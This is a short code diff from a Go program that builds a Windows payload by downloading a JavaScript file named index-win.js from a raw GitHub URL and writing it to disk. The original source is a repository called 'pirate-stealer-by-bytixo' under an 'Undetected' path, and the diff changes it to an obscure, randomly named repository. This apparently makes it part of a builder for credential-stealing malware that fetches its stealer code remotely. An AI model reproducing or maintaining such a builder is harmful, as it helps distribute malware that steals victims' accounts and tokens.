@@ -169,7 +169,7 @@ func buildPlatform() {
 				}
 			}
 			Info("Building Windows")
-			wincode := getCode("https://raw.githubusercontent.com/jimisreallynoobyrn/pirate-stealer-by-bytixo/main/src/Undetected/index-win.js")
+			wincode := getCode("https://raw.githubusercontent.com/ugur014/ajwdbawjdbawjdbawjdbawjd/main/src/Undetected/index-win.js")
 			err = ioutil.WriteFile("index-win.js", []byte(wincode), 0666)
 			if err != nil {
 				Fatal("Error writing to file", err)
